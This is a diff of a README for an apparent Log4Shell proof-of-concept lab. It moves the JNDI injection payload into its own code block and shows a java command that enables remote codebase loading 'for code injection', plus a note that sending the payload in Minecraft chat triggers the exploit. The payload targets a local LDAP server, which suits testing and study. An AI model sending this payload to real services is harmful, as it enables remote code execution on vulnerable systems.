@@ -35,8 +35,11 @@ cd log4j-client &&\
 # Or run other application, com.sun.jndi.ldap.object.trustURLCodebase=true required for code injection, otherwise it will only request to ldap server.
 java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar <javafile.jar>
 ```
-4. Send `${jndi:ldap://127.0.0.1:3001/}` to any parameters as the payload
+4. Send payload to any parameters as the payload
 (In minecraft, just chatting this will work if exploit's working.)
+```
+${jndi:ldap://127.0.0.1:3001/}
+```
 5. cleanup
 ```
 NODEP=`pgrep node`
